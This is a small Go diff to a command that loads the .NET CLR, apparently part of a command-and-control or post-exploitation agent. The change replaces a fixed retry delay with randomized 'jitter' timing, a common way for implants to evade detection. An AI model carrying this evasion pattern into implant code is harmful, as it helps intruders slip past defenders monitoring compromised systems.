@@ -84,7 +84,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			}
 			if strings.Contains(loadErr.Error(), "cannot find the file") {
 				output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
-				time.Sleep(500 * time.Millisecond)
+				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
 				continue
 			}
 			break // Non-transient error, stop retrying
